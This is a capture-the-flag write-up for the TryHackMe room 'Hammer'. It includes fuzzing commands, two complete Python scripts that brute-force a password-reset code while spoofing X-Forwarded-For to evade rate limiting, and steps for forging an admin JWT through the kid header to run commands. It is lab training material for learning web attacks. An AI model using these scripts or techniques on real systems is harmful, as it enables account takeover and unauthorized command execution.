---
title: "TryHackMe: Hammer"
author: jaxafed
categories: [TryHackMe]
tags: [web, ffuf, python, rate-limit, brute-force, authentication bypass, jwt, remote code execution]
render_with_liquid: false
media_subpath: /images/tryhackme_hammer/
image:
  path: room_image.webp
---

Hammer started with discovering a log file on the web application with fuzzing and an email address inside. With a valid email address in hand, we were able to request a password reset for the user. After bypassing the rate limit to be able to brute-force the password recovery code, we were successful in resetting the password for the user and accessing the dashboard. After gaining access to the dashboard, we used forged JWTs to escalate our role from user to admin to be able to run commands and completed the room.

[![Tryhackme Room Link](room_card.webp){: width="300" height="300" .shadow}](https://tryhackme.com/r/room/hammer){: .center }

## Initial Enumeration

### Nmap Scan

```console
$ nmap -T4 -n -sC -sV -Pn -p- 10.10.63.156
Nmap scan report for 10.10.63.156
Host is up (0.087s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 96:97:2f:db:56:5e:4e:5b:d5:f3:75:47:46:96:ac:e5 (RSA)
|   256 83:3b:7a:7a:9c:61:8b:19:ef:77:11:1f:28:c0:bf:05 (ECDSA)
|_  256 db:30:10:99:b1:71:85:59:21:5a:67:21:6d:98:f3:b6 (ED25519)
1337/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Login
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There are two ports open.

- 22/SSH
- 1337/HTTP

### Web 1337

Looking at `http://10.10.63.156:1337/`, we get a login form.

![Web 1337 Index](web_1337_index.webp){: width="1200" height="600" }

Clicking on the `Forgot your password?`, we get redirected to `http://10.10.63.156:1337/reset_password.php` where we see a form to input user email for a password reset.

![Web 1337 Reset Password](web_1337_reset_password.webp){: width="1200" height="600" }

Testing the form with a random email address, we get the message: `Invalid email address!`

![Web 1337 Reset Password Invalid Email](web_1337_reset_password_invalid.webp){: width="1200" height="600" }

## First Flag

### Discovering the Email

Checking the source code for `http://10.10.63.156:1337/`, we see a note left by the developer about the naming convention.

![Web 1337 Index Source](web_1337_index_src.webp){: width="700" height="300" }

Using `ffuf` to fuzz for any directories following this naming convention, we discover `/hmr_logs`.

```console
$ ffuf -u 'http://10.10.63.156:1337/hmr_FUZZ' -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -t 100 -mc all -ic -fw 23
...
css                     [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 416ms]
js                      [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 465ms]
images                  [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 519ms]
logs                    [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 813ms]
```
{: .wrap }

Looking at the `http://10.10.63.156:1337/hmr_logs/`, file indexing is enabled and there is a single file named `errors.log`.

![Web 1337 HMR Logs](web_1337_hmr_logs.webp){: width="600" height="400" }

Reading the `errors.log` file, we discover an email address: `tester@hammer.thm`

```console
$ curl -s 'http://10.10.63.156:1337/hmr_logs/error.logs'
[Mon Aug 19 12:00:01.123456 2024] [core:error] [pid 12345:tid 139999999999999] [client 192.168.1.10:56832] AH00124: Request exceeded the limit of 10 internal redirects due to probable configuration error. Use 'LimitInternalRecursion' to increase the limit if necessary. Use 'LogLevel debug' to get a backtrace.
[Mon Aug 19 12:01:22.987654 2024] [authz_core:error] [pid 12346:tid 139999999999998] [client 192.168.1.15:45918] AH01630: client denied by server configuration: /var/www/html/
[Mon Aug 19 12:02:34.876543 2024] [authz_core:error] [pid 12347:tid 139999999999997] [client 192.168.1.12:37210] AH01631: user tester@hammer.thm: authentication failure for "/restricted-area": Password Mismatch
[Mon Aug 19 12:03:45.765432 2024] [authz_core:error] [pid 12348:tid 139999999999996] [client 192.168.1.20:37254] AH01627: client denied by server configuration: /etc/shadow
[Mon Aug 19 12:04:56.654321 2024] [core:error] [pid 12349:tid 139999999999995] [client 192.168.1.22:38100] AH00037: Symbolic link not allowed or link target not accessible: /var/www/html/protected
[Mon Aug 19 12:05:07.543210 2024] [authz_core:error] [pid 12350:tid 139999999999994] [client 192.168.1.25:46234] AH01627: client denied by server configuration: /home/hammerthm/test.php
[Mon Aug 19 12:06:18.432109 2024] [authz_core:error] [pid 12351:tid 139999999999993] [client 192.168.1.30:40232] AH01617: user tester@hammer.thm: authentication failure for "/admin-login": Invalid email address
[Mon Aug 19 12:07:29.321098 2024] [core:error] [pid 12352:tid 139999999999992] [client 192.168.1.35:42310] AH00124: Request exceeded the limit of 10 internal redirects due to probable configuration error. Use 'LimitInternalRecursion' to increase the limit if necessary. Use 'LogLevel debug' to get a backtrace.
[Mon Aug 19 12:09:51.109876 2024] [core:error] [pid 12354:tid 139999999999990] [client 192.168.1.50:45998] AH00037: Symbolic link not allowed or link target not accessible: /var/www/html/locked-down
```
{: .wrap }

### Bypassing the Rate Limit

Now that we discovered a valid email address, we can try to reset the password for the user at `http://10.10.63.156:1337/reset_password.php`.

After submitting the email, we see a new form, this time asking for a 4-digit recovery code.

![Web 1337 Reset Password Code](web_1337_reset_password_code.webp){: width="1200" height="600" }

Since it is only a 4-digit code, we should be able to brute-force it easily. However, if we attempt to do so, we will first notice the `Rate-Limit-Pending` header in the response.

![Web 1337 Reset Password Rate Limit Header](web_1337_reset_password_rate_limit_header.webp){: width="1000" height="500" }

If we continue to make requests in quick succession, we will see it decreasing.

![Web 1337 Reset Password Rate Limit Header Two](web_1337_reset_password_rate_limit_header2.webp){: width="1000" height="500" }

And when it reaches zero, we see that now we are getting rate-limited.

![Web 1337 Reset Password Rate Limit ](web_1337_reset_password_rate_limit.webp){: width="1000" height="500" }

So, if we want to brute-force the recovery code, we need to figure out a way to bypass the rate limit.

Trying out different common methods for it, we have success using the `X-Forwarded-For` header.

First, we can see that we are rate-limited.

![Web 1337 Reset Password Rate Limit Bypass](web_1337_reset_password_rate_limit_bypass.webp){: width="1000" height="500" }

But if we add the `X-Forwarded-For: 127.0.0.1` header, we can see the rate limit counter being reset.

![Web 1337 Reset Password Rate Limit Bypass Two](web_1337_reset_password_rate_limit_bypass2.webp){: width="1000" height="500" }

Of course, once this counter also reaches zero, we will be once again rate-limited.

![Web 1337 Reset Password Rate Limit Bypass Three](web_1337_reset_password_rate_limit_bypass3.webp){: width="1000" height="500" }

But simply changing the IP address in the header, we are able to reset the counter once more.

![Web 1337 Reset Password Rate Limit Bypass Four](web_1337_reset_password_rate_limit_bypass4.webp){: width="1000" height="500" }

### Brute-forcing the Code

Now that we found a way to bypass the rate limit, I wrote a `Python` script for brute-forcing the recovery code.

```python
#!/usr/bin/env python3

import requests
import random
import threading

url = "http://10.10.63.156:1337/reset_password.php"
stop_flag = threading.Event()
num_threads = 50


def brute_force_code(session, start, end):
    for code in range(start, end):
        code_str = f"{code:04d}"
        try:
            r = session.post(
                url,
                data={"recovery_code": code_str, "s": "180"},
                headers={
                    "X-Forwarded-For": f"127.0.{str(random.randint(0, 255))}.{str(random.randint(0, 255))}"
                },
                allow_redirects=False,
            )
            if stop_flag.is_set():
                return
            elif r.status_code == 302:
                stop_flag.set()
                print("[-] Timeout reached. Try again.")
                return
            else:
                if "Invalid or expired recovery code!" not in r.text:
                    stop_flag.set()
                    print(f"[+] Found the recovery code: {code_str}")
                    print("[+] Printing the response: ")
                    print(r.text)
                    return
        except Exception as e:
            #print(e)
            pass


def main():
    session = requests.Session()
    print("[+] Sending the password reset request.")
    session.post(url, data={"email": "tester@hammer.thm"})
    print("[+] Starting the code brute-force.")
    code_range = 10000
    step = code_range // num_threads
    threads = []
    for i in range(num_threads):
        start = i * step
        end = start + step
        thread = threading.Thread(target=brute_force_code, args=(session, start, end))
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()


if __name__ == "__main__":
    main()


```
{: file="brute_force_code.py"}

First, it makes a password reset request for `tester@hammer.thm`. After that, it starts multiple threads to try different recovery codes with randomly generated IP addresses for the `X-Forwarded-For` header, and if it finds the right code, it prints the response to it, so we can see the next step.

> Even though we bypassed the rate limit, we still only have 180 seconds for brute-forcing the recovery code, and this script is only able to try approximately 3000–3500 codes during that time frame. This gives you a 1/3 chance of success, so you might need to run it multiple times. Also, you might try increasing the thread count, but I was getting too many timeout errors with any more than 50.
{: .prompt-warning }

Running the script, we see the next step after entering a valid code: a form for setting a new password.

```console
$ python3 brute_force_code.py
[+] Sending the password reset request.
[+] Starting the code brute-force.
[+] Found the recovery code: 6545
[+] Printing the response:
...
<h3 class="text-center">Reset Your Password</h3>
    <form method="POST" action="">
        <div class="mb-3">
            <label for="new_password" class="form-label">New Password</label>
            <input type="password" class="form-control" id="new_password" name="new_password" required>
        </div>
        <div class="mb-3">
            <label for="confirm_password" class="form-label">Confirm New Password</label>
            <input type="password" class="form-control" id="confirm_password" name="confirm_password" required>
        </div>
        <button type="submit" class="btn btn-primary w-100">Reset Password</button> <p></p>
        <button type="button" class="btn btn-primary w-100" style="background-color: red; border-color: red;" onclick="window.location.href='logout.php';">Cancel</button>
</form>
...
```
{: .wrap }

### Resetting the Password

Now that we know the next step after brute-forcing the code, we can modify our script a bit to also submit a new password upon discovering the valid code.

```python
#!/usr/bin/env python3

import requests
import random
import threading

url = "http://10.10.63.156:1337/reset_password.php"
stop_flag = threading.Event()
num_threads = 50


def brute_force_code(session, start, end):
    for code in range(start, end):
        code_str = f"{code:04d}"
        try:
            r = session.post(
                url,
                data={"recovery_code": code_str, "s": "180"},
                headers={
                    "X-Forwarded-For": f"127.0.{str(random.randint(0, 255))}.{str(random.randint(0, 255))}"
                },
                allow_redirects=False,
            )
            if stop_flag.is_set():
                return
            elif r.status_code == 302:
                stop_flag.set()
                print("[-] Timeout reached. Try again.")
                return
            else:
                if "Invalid or expired recovery code!" not in r.text and "new_password" in r.text:
                    stop_flag.set()
                    print(f"[+] Found the recovery code: {code_str}")
                    print("[+] Sending the new password request.")
                    new_password = "password123"
                    session.post(
                        url,
                        data={
                            "new_password": new_password,
                            "confirm_password": new_password,
                        },
                        headers={
                            "X-Forwarded-For": f"127.0.{str(random.randint(0, 255))}.{str(random.randint(0, 255))}"
                        },
                    )
                    print(f"[+] Password is set to {new_password}")
                    return
        except Exception as e:
            # print(e)
            pass


def main():
    session = requests.Session()
    print("[+] Sending the password reset request.")
    session.post(url, data={"email": "tester@hammer.thm"})
    print("[+] Starting the code brute-force.")
    code_range = 10000
    step = code_range // num_threads
    threads = []
    for i in range(num_threads):
        start = i * step
        end = start + step
        thread = threading.Thread(target=brute_force_code, args=(session, start, end))
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()


if __name__ == "__main__":
    main()


```
{: file="reset_password.py"}

Running the modified script, we were successful at brute-forcing the recovery code once more and resetting the password.

```console
$ python3 reset_password.py
[+] Sending the password reset request.
[+] Starting the code brute-force.
[+] Found the recovery code: 4401
[+] Sending the new password request.
[+] Password is set to password123
```

Using these new credentials to login at `http://10.10.63.156:1337/index.php`, we get redirected to `http://10.10.63.156:1337/dashboard.php` where we get our first flag.

![Web 1337 Dashboard](web_1337_dashboard.webp){: width="1200" height="600" }

## Second Flag

### Discovering the Key File

After gaining access to the dashboard, we see a form for running commands, but before we are able to run anything, we will be redirected back to `http://10.10.63.156:1337/index.php`. Checking the source code for `http://10.10.63.156:1337/dashboard.php`, we can see it is due to this script:

![Web 1337 Dashboard Source](web_1337_dashboard_src.webp){: width="1200" height="600" }

Since it is a client-side script, we can use `Burp` to intercept the response while logging in and simply comment out the line responsible for logging us out.

![Web 1337 Dashboard Script Intercept](web_1337_dashboard_script_intercept.webp){: width="1000" height="600" }
![Web 1337 Dashboard Script Intercept Two](web_1337_dashboard_script_intercept2.webp){: width="1000" height="600" }

After that, if we try to execute any commands, we see this is the request made to the `http://10.10.63.156:1337/execute_command.php` endpoint. Weirdly, it redirects us to the `/logout.php`.

![Web 1337 Execute Command](web_1337_execute_command.webp){: width="1000" height="600" }

Also looking at the source code for `http://10.10.63.156:1337/dashboard.php`, we can see the script responsible for making the request.

```js
$(document).ready(function() {
    $('#submitCommand').click(function() {
        var command = $('#command').val();
        var jwtToken = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L215a2V5LmtleSJ9.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzI1MDY3NzY4LCJleHAiOjE3MjUwNzEzNjgsImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJ1c2VyIn19.tVSPlVoWVHQjxxEL_QgxXleQDbO9t40MzlnfXWLrYCE';

        // Make an AJAX call to the server to execute the command
        $.ajax({
            url: 'execute_command.php',
            method: 'POST',
            data: JSON.stringify({ command: command }),
            contentType: 'application/json',
            headers: {
                'Authorization': 'Bearer ' + jwtToken
            },
            success: function(response) {
                $('#commandOutput').text(response.output || response.error);
            },
            error: function() {
                $('#commandOutput').text('Error executing command.');
            }
        });
    });
});
```

Well, the script we commented out was dealing with the `persistentSession` cookie, which is absent in our request to the `http://10.10.63.156:1337/execute_command.php` and looking at our login request, we can see why. While it sets this cookie for us, it sets it with a very short lifespan.

![Web 1337 Login](web_1337_login.webp){: width="1000" height="600" }

Adding this cookie back to the `http://10.10.63.156:1337/execute_command.php` request, this time we get the `Command not allowed` error.

![Web 1337 Execute Command Two](web_1337_execute_command2.webp){: width="1000" height="600" }

We can save the execute command request to a file using `Burp` as such after modifying the command parameter to be able to fuzz allowed commands easily.

![Web 1337 Execute Command Request](web_1337_execute_command_request.webp){: width="550" height="550" }

Now, we can use the saved request with `ffuf` to fuzz for any commands we can run using the [linux-commands-merged.txt](https://github.com/yzf750/custom-fuzzing/blob/master/linux-commands-merged.txt) wordlist.

```console
$ ffuf -request execute_command.req -request-proto http -w linux-commands-merged.txt -fr 'Command not allowed'
...
ls                      [Status: 200, Size: 179, Words: 1, Lines: 1, Duration: 93ms]
...
```
{: .wrap }

It seems `ls` is the only command we can run, and running it, we get a list of files in the current directory.

![Web 1337 Execute Command LS](web_1337_execute_command_ls.webp){: width="1000" height="600" }

Among the listed files, `188ade1.key` seems interesting; we can read it with `curl`.

```console
$ curl -s 'http://10.10.63.156:1337/188ade1.key'
56058354efb3daa97ebab00fabd7a7d7
```

### Examining the JWT

Since executing commands didn't lead us anywhere, let's focus on the JWT.

If we try to modify the signature in the JWT or anything in the data, we get the `Invalid token` error.

![Web 1337 Execute Command Invalid Token](web_1337_execute_command_invalid_token.webp){: width="1000" height="600" }

Examining the JWT using [JWT.IO](https://jwt.io/), there are two interesting parts:

- Our role is being set to `user`.
- `kid` parameter in the JWT header.

![JWT Decoded](jwt_decoded.webp){: width="1000" height="400" }

### Forging JWT to RCE

The `kid` parameter presumably points to a file on the server, which holds the key used for signing and verifying the JWTs.

We can try changing it to the key file we discovered before and can use it's contents as the key for signing our token.

![JWT Forged](jwt_forged.webp){: width="800" height="600" }

Testing the token we forged, we see it works as we don't get the `Invalid token` error.

![Web 1337 Execute Command Forged JWT](web_1337_execute_command_forged_jwt.webp){: width="1000" height="600" }

Now that we are able to forge tokens, we can change our role in the token data from `user` to `admin`.

![JWT Forged Two](jwt_forged2.webp){: width="800" height="600" }

Using this token on the `http://10.10.63.156:1337/execute_command.php` endpoint, we are now able to execute commands other than the `ls`.

![Web 1337 Execute Command Forged JWT Two](web_1337_execute_command_forged_jwt2.webp){: width="1000" height="600" }

With this, we are able to read the second flag at `/home/ubuntu/flag.txt` and complete the room.

![Web 1337 Execute Command Second Flag](web_1337_execute_command_second_flag.webp){: width="1000" height="600" }

<style>
.center img {        
  display:block;
  margin-left:auto;
  margin-right:auto;
}
.wrap pre{
    white-space: pre-wrap;
}

</style>